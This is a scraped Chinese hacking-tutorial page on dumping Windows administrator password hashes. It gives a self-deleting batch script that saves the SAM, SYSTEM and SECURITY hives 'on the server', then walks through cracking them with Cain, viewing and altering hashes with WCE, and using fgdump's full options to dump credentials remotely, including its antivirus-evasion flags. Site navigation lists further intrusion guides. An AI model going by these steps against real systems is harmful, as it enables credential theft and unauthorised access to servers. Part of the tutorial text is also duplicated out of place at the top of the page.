
## CAIN



打开CAIN选择LSA Secrets然后打开system.hive 和security.hive两个文件




加载后我们可以看到一些信息，这些信息可能会有明文密码，我这里是没有的。

如果没有我们就需要抓HASH了。点击CAIN的Cracker选项卡，加载sam.hive文件


拿到HASH了，www.jb51.net 下面就是破解，用工具自带的破解试试密码出来了，我设置的123456


•			脚本之家
•			软件下载
•			源码下载
•			在线工具
•			网页教程基础
•			服务器常用软件
•			手机版
•			  
关注微信

•	topNav End
￼


导航
•			网页制作
•			网络编程
•			脚本专栏
•			脚本下载
•			数据库
•			CMS教程
•			电子书籍
•			平面设计
•			媒体动画
•			操作系统
•			网站运营
•			网络安全
•			在线手册
导航结束
您的位置： 主页 \> 网络安全 \> 黑客教程 \>

•	head End
•	
•	content Star
抓取管理员hash值（哈希）的另类方法
作者：佚名 字体：[增加 减小]() 来源：互联网 时间：05-11 10:44:12 我要评论
哈希算法将任意长度的二进制值映射为固定长度的较小二进制值，这个小的二进制值称为哈希值。哈希值是一段数据唯一且极其紧凑的数值表示形式。如果散列一段明文而且哪怕只更改该段落的一个字母，随后的哈希都将产生不同的值。要找到散列为同一个值的两个不同的输入，在计


今天抓hash的时候发现GetHashes.exe不好使..另外又测试了几个也都不好用... 
不同版本的Windows的hash获取方法不一样.
用到的工具有pwdump7.exe、GetHashes.exe、SAMInside.exe、LC5、Cain、Proactive Password Auditor、Ophcrack.
 于是百度了一些资料穿上来！希望大家能学习一下。
 ====================================第1种===========================================
 使用工具 cain、cmd、wce1.2等
 首先使用通用方法抓取HASH
 使用命令先保存一份需要的信息。
 reg save hklm\sam sam.hive
 reg save hklm\system system.hive
 reg save hklm\security security.hive
 （这三个文件我找了个批处理,这样比较方便）
 ==========================
 @echo off
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
del %0
 ===========================
 保存为批处理文件,直接在服务器上运行。
 就会在批处理所在目录生成这三个文件
 和下面的效果一样，只不过简化了步骤
￼
然后我们使用CAIN打开保存到的system.hive 和security.hive两个文件。我是在虚拟机里面操作就直接在虚拟机里面搞了。。大家在服务器上搞可以下载到本地。
 打开CAIN选择LSA Secrets然后打开system.hive 和security.hive两个文件

加载后我们可以看到一些信息，这些信息可能会有明文密码，我这里是没有的。
￼
如果没有我们就需要抓HASH了。点击CAIN的Cracker选项卡，加载sam.hive文件。
￼

拿到HASH了，www.jb51.net 下面就是破解，用工具自带的破解试试密码出来了，我设置的123456
￼
我们也可以使用彩虹表来破解
下面我们使用wce来搞。。这个工具是渗透利器哈具体介绍大家自己百度去。
￼
从帮助来看我们可以使用-l参数查看NTML hash
 我们还可以用-s参数来改HASH值如图
￼
从图中我们可以看到最后一位的HASH我从4修改到了5

====================================第2种===========================================
fgdump 可以远程抓Hash的工具
 作者：TheLostMind
一直都是本地抓，今天上SamInside论坛看到一个开源的工具，fgdump，可以远程抓。
 http://swamp.foofus.net/fizzgig/fgdump/fgdump-usage.htm
 fgDump 2.1.0 - fizzgig and the mighty group at foofus.net
Written to make j0m0kun's life just a bit easier
Copyright(C) 2008 fizzgig and foofus.net
fgdump comes with ABSOLUTELY NO WARRANTY!
This is free software, and you are welcome to redistribute it
under certain conditions; see the COPYING and README files for
more information.
Usage:
fgdump [-?]()[-t]()[-c]()[-w]()[-s]()[-r]()[-v]()[-k]()[-o]()[-a]()[-O 32|64]()[-l logfile]()[-T threads]() [{{-h Host | -f filename} -u Username -p Password | -H filename}]()
where Username and Password have administrator credentials
-? displays help (you're looking at it!)
-t will test for the presence of antivirus without actually running the password dumps
-c skips the cache dump
-w skips the password dump
-s performs the protected storage dump
-r forgets about existing pwdump/cachedump files. The default behavior is to skip a host if these files already exist.
-v makes output more verbose. Use twice for greater effect
-k keeps the pwdump/cachedump going even if antivirus is in an unknown state
-l logs all output to logfile
-T runs fgdump with the specified number of parallel threads
-h is the name of the single host to perform the dumps against
-f reads hosts from a line-separated file
-H reads host:username:password from a line-separated file (per-host credentials)
-o skips pwdump history dumps
-a will not attempt to detect or shut down antivirus, even if it is present
 -O manually sets whether the target is a 32- or 64-bit OS. Note that this applies to all hosts specified.
** As of version 1.4.0, you can run fgdump with no parameters to dump the local box (no impersonation or binding)
测试了一下，很不错，简单翻译了一下帮助。
 用法:
fgdump [-?]()[-t]()[-c]()[-w]()[-s]()[-r]()[-v]()[-k]()[-o]()[-a]()[-O 32|64]()[-l logfile]()[-T threads]() [{{-h Host | -f filename} -u
]() Username -p Password | -H filename}]
 用户名和密码要求要有管理员资格
 -? 显示帮助
-t 测试当前的杀毒软件，并不是真正的转储密码
-c 跳过缓存转储
-w 跳过密码转储
-s 执行保护存贮转储
-r 忽略现存的pwdump/cachedump文件。默认的行为是跳过存在这些文件的主机。
-v 详细输出. 使用两次能获得更为详细的输出
-k 即使不知道杀毒软件的状态也继续执行pwdump/cachedump（进行密码转储）
-l 记录所有输出到日志文件
-T 使用指定数量的线程执行此程序
-h 需要执行密码转储的单个目标主机
-f 从用行分隔的文件中读取主机列表
-H 从用行分隔的文件中读取 主机名:用户名:密码
-o 跳过转储历史密码
-a 试图检测或关闭杀毒软件，即使杀毒软件正在运行
 -O 手工设置远程主机是32位操作系统还是64位操作系统。 注意：这项操作应用到所有指定的主机。
 ** 使用1.4.0,你可以直接运行此程序，不需要带参数，来转储本机密码
endmain


Tag：Hash  
相关文章
•			2016-02-15  
浅析XSS与XSSI异同
•			2016-02-01  
Android平台的SQL注入漏洞浅析(一条短信控制你的手机)
•			2016-02-01  
黑客七大惯用攻击策略(攻击与防范)
•			2016-01-27  
XSS跨站脚本攻击问题和原理详解
•			2016-01-20  
剖析DDoS攻击原理
•			2016-01-19  
防止xss攻击的有效方法
•			2015-12-17  
ARP欺骗原理以及路由器的先天免疫
•			2015-12-14  
防止CSRF攻击ASP.NET应用
•			2015-11-10  
比特币偷窃程序Dyreza的实现思路分析
•			2015-11-05  
CCProxy代理软件中隐藏的阴谋分析
•			2015-10-29  
管理员需知的DDOS攻击防御手册
•			2015-10-29  
高手轻松教你如何针对DDos部署防御措施

评论(0人参与，0条评论)

￼
放置cbox初始状态
展开状态
来说两句吧...
•			
•			  
  
  

表情 上传图片 uploading-efw
发布


放置cbox发布状态 用户登录
•			微博登录   

•			QQ登录   

•			手机登录   

提示条 零评论提示条
还没有评论，快来抢沙发吧！
评论列表 S
最新评论

评论列表 E
评论关闭 翻页

某站正在使用畅言
Powered by 畅言
•			
endborder
end fl

文章分类
•			黑客教程 安全设置 杀毒防毒 病毒查杀 脚本攻防 黑客入侵 工具使用 业界动态 Exploit 漏洞分析 加密解密 手机黑客 安全其它 

大家感兴趣的内容
•			1  
怎么盗别人的qq密码 新手指南
•			2  
最经典的黑客入门教程(必备技能)
•			3  
零距离感受入侵服务器 
•			4  
菜鸟拿WebShell的经验 
•			5  
局域网入侵完全版
•			6  
webshell 提权方法 服务器提权教程
•			7  
黑客基础知识 常用命令和快捷键大全
•			8  
网页挂马详细步骤教程
•			9  
网页挂马方法和技巧大汇总
•			10  
服务器 提权方法大全

最近更新的内容
•			浅析XSS与XSSI异同
•			Android平台的SQL注入漏洞浅析(一条短信控制你的手机)
•			黑客七大惯用攻击策略(攻击与防范)
•			XSS跨站脚本攻击问题和原理详解
•			剖析DDoS攻击原理
•			防止xss攻击的有效方法
•			ARP欺骗原理以及路由器的先天免疫
•			防止CSRF攻击ASP.NET应用
•			比特币偷窃程序Dyreza的实现思路分析
•			CCProxy代理软件中隐藏的阴谋分析



end fr
•	end content
关于我们 - 广告合作 - 联系我们 - 免责声明 - 网站地图 - 投诉建议 - 在线投稿
©CopyRight 2006-2016 JB51.Net Inc All Rights Reserved. 脚本之家 版权所有

